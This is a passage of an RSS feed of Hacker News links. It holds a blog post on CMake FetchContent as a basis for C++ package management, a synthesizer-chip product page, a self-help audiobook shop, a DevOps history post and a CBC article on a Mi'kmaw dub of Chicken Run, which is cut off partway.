<p>I recently encountered a CMake feature which I wasn’t aware of. It’s <a href="https://cmake.org/cmake/help/latest/module/FetchContent.html">FetchContent</a>. I’m sure this is not news to most people since it was added in CMake 3.14<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> and that’s been around since February of 2019, so two years now, but this feature is a revelation.</p>

<p>It can… no, it should… no, it <em>must</em> become the stepping stone for future of C and C++ package managers.</p>

<p><em>… after an issue with it is resolved, which I will talk about furhter down in the post</em></p>

<h2 id="so-what-is-fetchcontent">So, what is FetchContent?</h2>

<p>It’s pretty straight forward, actually. By using two CMake functions: <code>FetchContent_Declare</code> and <code>FetchContent_MakeAvailable</code><sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> users can declare a named content item which can then be… well… fetched <em>in configure time</em>. The key here is, as opposed to <code>file(DOWNLOAD ...)</code>, this allows three important things:</p>

<ul>
  <li>Define the means by which the content is produced (not just source, but also types of sources)</li>
  <li>Have an identifiable name for the content</li>
  <li>Maintain the coherency of the content in a well-defined manner</li>
</ul>

<p>Here’s an example directly from the CMake docs:</p>

<div><div><pre><code><span>include</span><span>(</span>FetchContent<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
  googletest
  GIT_REPOSITORY https://github.com/google/googletest.git
  GIT_TAG        release-1.8.0
<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
  Catch2
  GIT_REPOSITORY https://github.com/catchorg/Catch2.git
  GIT_TAG        v2.5.0
<span>)</span>

<span># After the following call, the CMake targets defined by googletest and</span>
<span># Catch2 will be defined and available to the rest of the build</span>
<span>FetchContent_MakeAvailable</span><span>(</span>googletest Catch2<span>)</span>
</code></pre></div></div>

<p>Ha! <code>GIT_REPOSITORY</code>! See? See? This lets us use CMake for package management.</p>

<h2 id="but-what-about-my-favorite-package-manager">But what about My-Favorite-Package-Manager™?</h2>

<p>I get it. Conan, vcpkg and the many<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> others that exist are great, but they are external. Of course I’ve experimented with the popular C++ package managers, but I’ve been reluctant to actually start using one for my projects. They may have CMake integrations but they are not triggered by CMake. They try — and succeed — to be more than CMake. The thing is that, like it or not, CMake is, or at least getting really close to being, the de-facto standard build system for C++<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>. CMake is terrible in many ways, but it has proven to be the best we’ve have<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>.</p>

<p>So what do we get by bundling the package manager with the build system?</p>

<p><a href="https://en.wikipedia.org/wiki/Nix_package_manager">Nix</a> (which is awesome) or <a href="https://doc.rust-lang.org/cargo/guide/">Rust’s Cargo</a></p>

<h3 id="packages-from-source">Packages from source</h3>

<p>Oh, this package has <code>CMakeLists.txt</code>? You don’t need to download a binary when you can just fetch it and <code>add_subdirectory</code>… it<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup>. It will inherit everything you need from your project.</p>

<h3 id="only-the-packages-we-need">Only the packages we need</h3>

<p>Sure, you can define different packages depending on platform, <a href="https://vcpkg.readthedocs.io/en/latest/users/triplets/">triplet</a>, and other configurations from other package managers, but you’re using their language. And then you have to either reimplement the same configuration analysis in you CMake files, or use some exports from those package managers, which is not always easy. If your package manager is within CMake, you already, inevitably, have all the tools to configure your build. The information for <a href="https://cmake.org/cmake/help/v3.3/variable/CMAKE_LANG_COMPILER.html">the compiler</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_CXX_STANDARD.html">standard</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_SYSTEM_NAME.html">target platform</a>, the <a href="https://cmake.org/cmake/help/latest/variable/CMAKE_SYSTEM_PROCESSOR.html">architecture</a>, the <a href="https://cmake.org/cmake/help/latest/variable/BUILD_SHARED_LIBS.html">linkage</a>, and <a href="https://cmake.org/cmake/help/latest/manual/cmake-toolchains.7.html">everything else</a> is already there.</p>

<h3 id="single-command-configuration">Single command configuration</h3>

<p><code>$ cmake .</code></p>

<p>…and everything works, everything is up to date, and everything is there. You are ready to build.</p>

<h2 id="can-i-use-fetchcontent-now">Can I use FetchContent now?</h2>

<p>Sort of.</p>

<p>Of course you can use the raw calls, even though they are not yet a package manager. <a href="https://github.com/adobe/lagrange/tree/72f9a5447b6803245d43a37a18b76e59c16fbda8/cmake/recipes/external">Adobe do exactly that</a>.</p>

<p>And, though the feature has been around for some time, I’m only aware of a single package manager which is built with it: <a href="https://github.com/TheLartians/CPM.cmake">CPM</a>.</p>

<p>Now, CPM is awesome and I’ve started using it in my personal projects. Everything new I make uses CPM and I’ve migrated some old stuff, too. However it’s not a mature and complete package manager. It can’t error on package version inconsistencies (though it can detect them) and it’s not built to handle binary packages. Source only. That, however, might be the thing you need. It is enough for most of my needs. I wholeheartedly recommend it for personal and/or small projects.</p>

<p>But!</p>

<p>There is a huge problem. Not with CPM, but with FetchContent itself. FetchContent can’t be <strong>the</strong> API package managers are built upon today.</p>

<p>This problem is performance. FetchContent is just too slow to be used for a serious load. It’s not an unfixable problem, but as far as I understand the issue, it will most likely have to be reimplemented. Here’s a table with me experimentig on different machines containing roughly<sup id="fnref:7" role="doc-noteref"><a href="#fn:7">7</a></sup> how much time it takes to run FetchContent per content item, or package. <a href="https://github.com/iboB/cmake-fetch-content-perf/blob/82ee13918550f18bbf22bd3bf38c721a7de9fb80/CMakeLists.txt">Here’s the CMakeLists.txt</a> I used. Note that these times are not from fetching the packages. They are from a “noop” run. One which identifies that everything is up to date, and does nothing.</p>

<table>
  <thead>
    <tr>
      <th>OS</th>
      <th>CMake Version</th>
      <th>Generator</th>
      <th>Machine</th>
      <th>~ ms per item</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Ubuntu 20.04</td>
      <td>3.16.3</td>
      <td>Unix Makefiles</td>
      <td>ThreadRipper, SSD</td>
      <td>200</td>
    </tr>
    <tr>
      <td>Arch Linux</td>
      <td>3.19.2</td>
      <td>Unix Makefiles</td>
      <td>8 core @ 2.4 GHz, HDD</td>
      <td>800</td>
    </tr>
    <tr>
      <td>Windows 10</td>
      <td>3.19.2</td>
      <td>Visual Studio 2019</td>
      <td>ThreadRipper, SSD</td>
      <td>1200</td>
    </tr>
    <tr>
      <td>Windows 10</td>
      <td>3.19.2</td>
      <td>MinGW Makefiles</td>
      <td>ThreadRipper, SSD</td>
      <td>1200</td>
    </tr>
    <tr>
      <td>Windows 10</td>
      <td>3.16.3</td>
      <td>MinGW Makefiles</td>
      <td>6 core @ 3 GHz, SSD</td>
      <td>1500</td>
    </tr>
  </tbody>
</table>

<p>That’s at <em>configure time</em>, so every time the CMake scripts are touched, it will get executed. As you can see even the best time of roughly 200 ms per item is pretty bad, but the Windows times of over 1 second are abysmal. It’s simply prohibitive for a project with hundreds or even tens of dependencies to spend 1 second per dependency only to confirm that it’s up to date.</p>

<p>I opened <a href="https://gitlab.kitware.com/cmake/cmake/-/issues/21703">an issue on CMake’s tracker</a><sup id="fnref:8" role="doc-noteref"><a href="#fn:8">8</a></sup> about that, and hopefully it will get addressed in some way. I even have some ideas of how this can be addressed from the outside, just with CMake user code, but I hope it won’t come to this.</p>

<p>I truly believe that this is the future of C++ package management. If the preformance issue is fixed (or worked around), I think in several years C++ package management will be based on FetchContent. Whether CPM will become <em>the</em> new de-facto standard or some other not-yet-written software, I can’t tell, but this is it! I can feel it!</p>

<hr>



</section>







  
  



  

</div></div>]]>
            </description>
            <link>http://ibob.github.io/blog/2020/01/13/cmake-package-management/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779120</guid>
            <pubDate>Thu, 14 Jan 2021 17:20:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sound Semiconductor – IC's for Music Creation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778717">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | http://www.soundsemiconductor.com/index.html | <a href="https://web.archive.org/web/*/http://www.soundsemiconductor.com/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div>
                    <h2>SSI2130</h2>
                    <h4>Voltage Controlled Oscillator</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2130chip.jpg"></p><p>Designer Derek Bowers has been imagining this chip since building his first synth during college! The FatKeys™ SSI2130 provides beautiful triangle, sawtooth, pulse, and square waveforms with unprecedented temperature stability; and adds an on-chip mixer, low distortion sine wave generator, through-zero FM/PM capability and more in an ultra-compact PCB footprint.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2130datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPQN32.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2131</h2>
                    <h4>Voltage Controlled Oscillator</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2131chip.jpg"></p><p>The FatKeys™ SSI2131 Voltage Controlled Oscillator provides the core VCO function with triangle, sawtooth, and PWM-variable pulse waveform outputs over a ten-octave range. The device offers unparalleled temperature stability, exponentiality, waveform integrity, and ease of use while requiring an absolute minimum of external components.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2131datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSL16.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2140</h2>
                    <h4>Voltage Controlled Multi-Mode Filter</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2140chip.jpg"></p><p>A refresh of a classic design, the FatKeys™ SSI2140 preverses mojo of the beloved SSM2040 and adds temperature compensation of <i>gm</i> cells and the exponential control port. A "Q VCA" is provided to allow easy resonance control as well as various options for Q compensation. The four transconductance cells are highly configurable for a variety of pole and mode combinations.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2140datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL20.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2144</h2>
                    <h4>Voltage Controlled Low-Pass Filter</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2144chip.jpg"></p><p>The second of two legendary SSM filter updates, the FatKeys™ SSI2144 is a dedicated four-pole low-pass ladder filter with on-chip resonance control. Original designer Dave Rossum did a number of performance updates such as lower noise, improved control feedthrough, and logical pin grouping but otherwise left this sweet-sounding VCF alone.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2144datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL16.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2161</h2>
                    <h4>Voltage Controlled Amplifier</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2161chip.jpg"></p><p>A very high performance single-channel VCA for the most demanding applications, the ProCircuit™ SSI2161 offers industry-leading lowest-noise, and a mode control to optimize noise vs. distortion performance. All at low-cost and in a 10-lead SSOP package.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2161datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL10.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2162</h2>
                    <h4>Voltage Controlled Amplifier</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2162chip.jpg"></p><p>The FatKeys™ SSI2162 provides two independent VCA channels, and like its SSI2161 and SSI2164 siblings offers great flexibility in design of dynamics processors, automatic or remote level control, and voltage controlled filters. Highly compact 10-lead SSOP package.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2162datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSSL10.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
                <div>
                    <h2>SSI2164</h2>
                    <h4>Voltage Controlled Amplifier</h4>
                    <p><img src="http://www.soundsemiconductor.com/images/ssi2164chip.jpg"></p><p>The FatKeys™ SSI2164 is perhaps the most flexible VCA available, with four independent channels for lowest cost-per-VCA. The user-selectable mode control allows Class A, AB, or intermediate biasing, and current inputs and outputs provide great design freedom. Ideal for voltage-controlled filters.</p>
                    <p><a href="http://www.soundsemiconductor.com/downloads/ssi2164datasheet.pdf" role="button">Data Sheet »</a><a href="http://www.soundsemiconductor.com/downloads/PODPSL16.pdf" role="button">Pkg. Spec. »</a></p>
                </div>
            </div></div>]]>
            </description>
            <link>http://www.soundsemiconductor.com/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778717</guid>
            <pubDate>Thu, 14 Jan 2021 16:55:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Built a spreadsheet powered shop for my self-help audiobooks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25778339">thread link</a>) | @azarai
<br/>
January 14, 2021 | https://mindfuldevmag.com/you/ | <a href="https://web.archive.org/web/*/https://mindfuldevmag.com/you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    
    

<section>

	

</section>

<section>
    <div>
      <div>
        <h2>Get the Bundle for $39 instead of <del>$111</del></h2>
        <p>The Become the Best You Mega Bundle includes all 11 books as audiobooks and eBooks (except 1). </p>
      </div>
      
    </div>
  </section>
    <section>

        

    </section>

    
    <div id="modal-item-1">
        
        
        <div>
          
          
    
          
          <div>
            
            
    
            <div>
                <p>In this book, we’re going to examine this process of using behavior-based goals to become happier, healthier and much more productive.</p>

<p>We’ll start by looking at the concept of behavior-based goals, learning what they are and why they are an important tool in a well-rounded life. Next, we’ll look at behavior versus results.</p>

<p>We’ll learn how results are actually simply a by-product of everyday learned positive behaviors. Finally, we’ll take a look at some tips and best practices that will allow you to implement the behaviors that can help you to more effectively reach your goals.</p>

                <p>Inlcudes: eBook &amp; Audiobook</p>
                <p>Length: 34 Minutes</p>
                
                <p>
                    <audio controls="">
                        <source src="https://mindfuldevmag.com/you/media/behavior-based-goals-sample.mp3" type="audio/mpeg">
                        Your browser does not support the audio tag.
                      </audio>
                </p>
                
            </div>
            
            
            
          </div>
        </div>
      </div>
      
    <div id="modal-item-2">
        
        
        <div>
          
          
    
          
          <div>
            
            
    
            <div>
                <p>Yes, Minimalism Sucks When You Follow the Zealots on YouTube.</p>

<p>Thus Dogma-Free it Helps You to Live Without Debt and Worrying - Enjoying Your Life Again</p>

<p>Let's start your minimalism to de-clutter your life and be happier; dogma-free and with the pure essentials only.</p>

<p>Did you know that you can apply minimalism to books too? It is harder for the author to write those, but much easier for you, the reader, to learn and use the essentials directly without wading through fluffy pages and getting lost - getting lost means you will not take action. And taking action is THE crucial step you need to do. Now, and not tomorrow. Tomorrow is NO Action land. Change your life now and stop wasting time.I learned it the hard way and I am thankful that I took action.</p>

<p>My mom was a hoarder, and even I was not one, I had a hard time saying goodbye to things. Luckily, that changed one day, and I began my minimalism journey without knowing it at that point. It wasn't a fad yet and YouTube wasn't born. However, it made my life better. And it works fine for our family of three too.</p>

<p>However, I am not sure if I had even considered it when my first encounter were those YouTubers you see nowadays. Crazy zealots who go nuts. It is a nightmare and turns away too many people from an excellent idea. People who can benefit from minimalism and make their life better and living on our planet too. Somebody like you. Don't go away; minimalism can help you.</p>

<p>Listen to this audiobook and learn how.</p>


                <p>Inlcudes: eBook &amp; Audiobook</p>
                <p>Length: 48 Minutes</p>
                
                <p>
                    <audio controls="">
                        <source src="https://mindfuldevmag.com/you/media/minimalism-sucks-sample.mp3" type="audio/mpeg">
                        Your browser does not support the audio tag.
                      </audio>
                </p>
                
            </div>
            
            
            
          </div>
        </div>
      </div>
      
    <div id="modal-item-3">
        
        
        <div>
          
          
    
          
          <div>
            
            
    
            <div>
                <p>WTF, shut up, mind, I want to sleep. Are you stuck in an endless loop of the same negative thoughts and emotions? If any of the following questions apply to you, you are at the right place for your solution:</p><ul><li>Your mind is running at full speed, and you can get no sleep?</li><li>Are you constantly worried for no apparent reason?</li><li>You were happy, and all of a sudden you feel angry for no reason and snap at your loved ones?</li><li>Is your mind doing its chitchat all day long and commanding your life?</li></ul><p>Welcome to the club. You are not alone. Thanks to our modern society, that got even worse. Too many people are stuck in their mind and are often dominated by negative thoughts and emotions.</p><p>Am I good enough? Why is this guy at work so mean? Why did he do that? How can I get more money? I hate everything.&nbsp;</p><p>And when you think the disturbing thoughts and emotions are gone, they will come back to you in the most unpleasant situations, like happily playing with your kids. Fortunately, you can change that. We can train our mind to stop those thoughts and regain control of our life.&nbsp;</p><p>In the audiobook, we will step you through the process of regaining control of your thoughts and emotions. You will learn:&nbsp;</p><ul><li>Why our mind behaves like that and what is going wrong</li><li>How you can use your body to change your mind</li><li>How your environment can help you in silencing your mind</li><li>Why drinking tea helps</li><li>How mindfulness will guide you to freedom</li><li>How proven meditation techniques will assist you in your journey</li></ul><p>Don't stay paralyzed in what feels like your personal hell; join us and learn how to get your freedom. Do not hesitate; buy the audiobook and start now.</p>

                <p>Inlcudes: eBook &amp; Audiobook</p>
                <p>Length: 106 Minutes</p>
                
                <p>
                    <audio controls="">
                        <source src="https://mindfuldevmag.com/you/media/becoming-mindful-sample.mp3" type="audio/mpeg">
                        Your browser does not support the audio tag.
                      </audio>
                </p>
                
            </div>
            
            
            
          </div>
        </div>
      </div>
      
    <div id="modal-item-4">
        
        
        <div>
          
          
    
          
          <div>
            
            
    
            <div>
                <p>Do you feel stuck in the same pattern of eat, stress, sleep, stress, work, stress and sleep?
Does it seem like no matter what you do, you just can't fully relax?
Are you tired of living your life like you're constantly chasing your tail with no fulfillment and contentment in sight?</p>

<p>Welcome to the club. You are not alone. Thanks to our modern society, most people are stressed out. Too many people feel overworked, underpaid, and yes, over stressed.</p>

<p>Thankfully, there's a quick, simple, easy, and effective way out of all of this. Best of all, it won't cost you any money. That's right; there's no expensive equipment to buy, no mind altering pills to take, and no tiring physical exercises to adopt. The answer to your problems is MEDITATION.</p>

<p>With “Meditation For Beginners,” We step you through 5 powerful meditation techniques that can help you find that peace of mind that's been so elusive. By learning to relax your mind, you relax your body, and your life starts to look manageable once again. These techniques were cherry picked based on the fact that they are easy to learn and practice. They have also been selected based on their efficiency and effectiveness.</p>

<p>Get the peace of mind you deserve and read this book today. It can give you the inner calm and quiet inner confidence you need to take your life to a higher, and more relaxing, level!</p>

<p>You owe it to yourself.</p>


                <p>Inlcudes: eBook &amp; Audiobook</p>
                <p>Length: 45 Minutes</p>
                
                <p>
                    <audio controls="">
                        <source src="https://mindfuldevmag.com/you/media/meditation-for-beginners-sample.mp3" type="audio/mpeg">
                        Your browser does not support the audio tag.
                      </audio>
                </p>
                
            </div>
            
            
            
          </div>
        </div>
      </div>
      
    <div id="modal-item-5">
        
        
        <div>
          
          
    
          
          <div>
            
            
    
            <div>
                <p>This compact workbook will help you find your drive - your <q>why</q>.</p>

<p>Forget passion, and find something much more valuable and thus, your start into a bright future, where you know what you want and that powers you.</p>

<p>Everyone and his mom were talking about passion but in such overused and misused fashion that it depressed me. I did not have a passion, and I could not find it. Regardless of what I heard, it was just the same blah, blah, blah. It just frustrated me even more.</p>

<p>I tried a lot and took many wrong turns, but eventually, I found something that was way more important than any passion - my <q>why</q> - my drive.</p>

<p>My <q>why</q> fires me without burning me. It is deeper than passion. It's close to the core, the core of my being. When my <q>why</q> aligns with what I am doing, I feel satisfied, fulfilled, relaxed, and calm - the perfect state of satisfaction.</p>

<p>You, too, can get that, and I will teach you exactly how I got there. I tell you about the four exercises (plus, a small bonus) which helped me the most to find my <q>why</q>. This book is compact, without fluff, without endless repetition, and not esoteric. The actual listening time might be short, but it is a workbook. You need to do the exercises, otherwise, you will fail. </p>

<p>I welcome you to join on your journey to your <q>why</q> - what drives you.</p>


                <p>Inlcudes: eBook &amp; Audiobook</p>
                <p>Length: 52 Minutes</p>
                
                <p>
                    <audio controls="">
                        <source src="https://mindfuldevmag.com/you/media/find-your-why-sample.mp3" type="audio/mpeg">
                        Your browser does not support the audio tag.
                      </audio>
                </p>
                
            </div>
            
            
            
          </div>
        </div>
      </div>
      
    <div id="modal-item-6">
        
        
        <div>
          
          
    
          
          <div>
            
            
    
            <div>
                <p>Stop limiting yourself by dreaming to small.</p>

<p>Learn why you should dream big, how to reach your dreams and how to stay motivated by listening to this intentionally short bundle.</p>


                <p>Inlcudes: Audiobook</p>
                <p>Length: 24 Minutes</p>
                
                <p>
                    <audio controls="">
                        <source src="https://mindfuldevmag.com/you/media/dream-big-sample.mp3" type="audio/mpeg">
                        Your browser does not support the audio tag.
                      </audio>
                </p>
                
            </div>
            
            
            
          </div>
        </div>
      </div>
      
    <div id="modal-item-7">
        
        
        <div>
          
          
    
          
          <div>
            
            <div>
              <p>Simplify Your Life …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mindfuldevmag.com/you/">https://mindfuldevmag.com/you/</a></em></p>]]>
            </description>
            <link>https://mindfuldevmag.com/you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778339</guid>
            <pubDate>Thu, 14 Jan 2021 16:31:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The evolution into DevOps and why it works today]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778328">thread link</a>) | @gunnerAK
<br/>
January 14, 2021 | https://www.effx.com/blog/the-evolution-into-devops-and-why-it-works-today | <a href="https://web.archive.org/web/*/https://www.effx.com/blog/the-evolution-into-devops-and-why-it-works-today">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Over the last several years and during my time at Atlassian, I’ve been lucky enough to learn from hundreds of engineering teams about their current development practices, their origins, and where they strive to be from an engineering perspective.&nbsp;</p><p>Culturally, one of the most common themes for each organization was moving towards some form of a DevOps model. I also noticed that the majority of organizations I spoke to were on a slightly different journey or maturity level in terms of how they’d adopted or planned to adopt DevOps. A lot of where they were today was based on the roots of where they started off as an organization. For that reason, it’s important we know a little bit about the history of how we’ve made it to our cloud-native world as it is today.&nbsp;</p><p>We can define the evolution of the internet over the past few decades as three different “acts”. Act one, two, and three. Within each act there’s a gradual evolution of the internet and how engineering teams operated their applications during each one of them.&nbsp;<strong>‍</strong></p><h4><strong>Act 1: Early to mid 90s and the rise of dot com&nbsp;</strong></h4><p>‍</p><p><strong>A quick history:&nbsp;</strong><br></p><p>This was the early years of the internet where available bandwidth was still lacking, and the complexity of software increased at a rate faster than the ability of hardware to handle it. It was critical for businesses to figure out a way to get apps on multiple PCs without filling up too much space, while also providing the ability to access from anywhere. The best way to do that was to host the data on someone else's computer, or what was then called a Data Center.&nbsp;<br></p><p><strong>Example companies:&nbsp;</strong></p><p>America Online (AOL)&nbsp;<br></p><figure><p><img src="https://assets-global.website-files.com/5fd1d1ab54430e6b747263b2/60006e395cf1b9d84db3da56_ApLCwUOIagCmUTUDXIQfIsqeqBT5OnmO2Kz-QO5PN4T0KlBdoZjYZcIpUHxUIjpi58dUDLmyOw2OyNrW1SjAi_Miv02YFTfn8tkghYy3v3iHGTCugcz2YJWUiOOBQAfJQJUWUzQH.png" alt=""></p></figure><p><strong>Operations model:&nbsp;</strong></p><p>Engineering cycles were extremely long as there were still three siloed roles which consisted of development, operations, and QA in order to move applications through the software development lifecycle and into production. Every single one of these applications were deployed into a dedicated data center which would be monitored by operations teams who were familiar with the systems if anything went wrong.&nbsp;<br></p><h4><strong>Act 2: Late 90s, early 2000s and the rise of internet hyper-growth superstars&nbsp;</strong><br></h4><p>‍</p><p><strong>A quick history:&nbsp;</strong></p><p>With Salesforce.com, Amazon, and Google leading the way, the internet and SaaS started becoming a bit more mainstream and new business models began emerging. These faster moving, hyper-growth companies started adopting hints of what we see in today's modern DevOps and agile development practices.&nbsp;<br></p><p><strong>Example companies:&nbsp;</strong></p><p>Amazon, Google, &amp; Salesforce.com&nbsp;</p><figure><p><img src="https://assets-global.website-files.com/5fd1d1ab54430e6b747263b2/60006e39f9b70cd79a632237_NfQnOJ-5BsRD-H3x28P0flYVHdnpdrK8WzHrhKcBkcsGw_5o7I5Age043Ri0ZKozBgsJ9aZZ9cI41E4d9Fs8fHeirJzIwHSAUnlj6-oLhHS94qWaDwvQc63lVdr-whsWole0i_KV.png" alt=""></p></figure><p><strong>Operations model:&nbsp;</strong></p><p>Applications were still deployed and monitored in their own very large data centers, although because of the massive scale and growth of some of these companies, it made sense to build out a central infrastructure team that could manage common issues dependent on any services. This is also when Site Reliability Engineer and Systems Engineer roles were eventually born.&nbsp;<br></p><h4><strong>Act 3: The 2010s, beginnings of cloud-native, and high-availability cloud</strong><br></h4><p>‍</p><p><strong>A quick history:</strong>&nbsp;</p><p>During this era, internet and SaaS applications are developed on top of one of the big three public cloud providers: AWS, GCP, or Azure. The emergence of cloud-native in this era also came with more competition, so building faster, scalable, and resilient applications that contributed directly to business growth was key. Also for many of these organizations, the introduction of Kubernetes would create huge efficiency gains like reclaiming any unused capacity during off-peak hours and reducing build times.&nbsp;<br></p><p><strong>Example companies:&nbsp;</strong></p><p>Airbnb, Box, Pinterest&nbsp;</p><figure><p><img src="https://assets-global.website-files.com/5fd1d1ab54430e6b747263b2/60006e3af711dc73a4a0cda4_aKhuOhookGB842E7yMFRgIvc1HrJyV0Ev2T49W0B1UxVqhtgVRa499CifCBcuf1zn4yreok1jafe-0fTNac9Srqw67Vj5AJesB9BhhGKx9bGxRdMGf87XP5Ysc087mTjJ9r_4pFw.png" alt=""></p></figure><p><strong>Operations model:&nbsp;</strong></p><p>Software iterations happen at lightning speeds, and getting product in the hands of customers as fast as possible is the priority. The technology that comes out of the box from the big three public cloud providers allows for much more flexibility and freedom for the organizations born during this ‘act’. Act 3 marked the transition away from dedicated operations teams focused solely on making sure infrastructure was still running services, especially earlier on in the company's growth stages. Now, resources can be poured into engineers who can handle both development and operations -- leading to what we now call a “You build it, you run it” model.&nbsp;<br></p><h4><strong>Why DevOps works today and what to keep in mind&nbsp;</strong><br></h4><p>The big three public cloud providers have not only lowered barriers for start-ups, but they’ve also provided an amazing foundational infrastructure for any size company to build on. It’s really helped tear down the walls between development and operations, because with it your infrastructure starts to look a lot like software too. Engineers can much more easily understand the API driven nature, and their infrastructure starts to look a lot like code -- which is exactly what they’re used to.&nbsp;<br></p><p>Now that engineers are even closer to what’s going on in their infrastructure, operations more naturally comes as part of the day-to-day. Most of the rudimentary operational tasks we’ve experienced in Act 1 &amp; 2 have been automated to a point where now you can both own it, all while shipping product faster. While some may think that the move to cloud-native will make the traditional operations engineer obsolete, this couldn’t be further from the truth. Even with all the latest advancements in infrastructure, the engineers who focus on operations and reliability still have critical roles and skill sets needed during different stages of a scaling organization.&nbsp;<br></p><p>All in all, if you’re wondering what’s the right model for your organization -- the answer is it really depends. Depending on the size, scale, growth or what makes sense for the engineering organization some may go the way of the site reliability or systems engineering model. For many companies, the right way might be a pure DevOps, “you build it, you run it” model built on the public cloud, taking into account the number of engineers, reliability/SLO’s required, and how fast the team needs to iterate and ship code.&nbsp;<br></p><p>What doesn’t change though is the need to ship code as fast, confidently, and reliably as possible. Whichever model you choose the dynamics and ecosystem for engineering teams is becoming extremely complex. All the moving pieces around your infrastructure, services, metadata, components, ownership, teams, deploys, on-call schedules, incidents etc. occupies a level of mindshare in the back of every engineer’s head. We need to set that free. effx helps the world’s best engineering teams do that -- <a href="https://www.effx.com/"><strong>you should take it for a spin here for free.</strong></a><strong>&nbsp;</strong></p></div></div></div>]]>
            </description>
            <link>https://www.effx.com/blog/the-evolution-into-devops-and-why-it-works-today</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778328</guid>
            <pubDate>Thu, 14 Jan 2021 16:30:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Chicken Run became a cult classic in the Mi'kmaw language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25778299">thread link</a>) | @empressplay
<br/>
January 14, 2021 | https://www.cbc.ca/news/canada/nova-scotia/eskasoni-mi-kmaw-language-overdubb-chicken-run-johnson-family-1.5871741 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/nova-scotia/eskasoni-mi-kmaw-language-overdubb-chicken-run-johnson-family-1.5871741">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A British animated film&nbsp;from 2000 about a hen and rooster's daring escape from a chicken farm has become an unlikely tool for promoting the Mi'kmaw language, thanks to the Johnson family in Eskasoni, N.S.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5871797.1610567119!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/carol-anne-and-tom-johnson.jpg"></p></div><figcaption>Carol Anne and Tom Johnson in Eskasoni, N.S., still get requests from people who want a copy of their overdubbed version of Chicken Run.<!-- --> <!-- -->(Holly Conners/CBC)</figcaption></figure><p><span><p>A British animated film&nbsp;about a hen and rooster's daring escape from a chicken farm has become an unlikely tool for promoting the Mi'kmaw language in Nova Scotia and beyond.</p>  <p>Tom and Carol Anne Johnson from Eskasoni, N.S., along with some of their&nbsp;relatives, overdubbed the 2000 movie <em>Chicken Run</em> in Mi'kmaw about a decade ago. Since then, it's become a cult classic,&nbsp;and they&nbsp;still get&nbsp;requests from people who want to watch it.</p>  <p>"Some people are just hearing it for the first time and they're looking for copies," Carol Anne Johnson told CBC Radio's <em>Mainstreet</em>. "It's all over Cape Breton and the mainland and whoever wants to hear their language really appreciates it, especially if they're away from home."</p>  <p>The family has passed out many copies on&nbsp;DVD&nbsp;over the years, and even heard of kids watching it so many times they wore out their 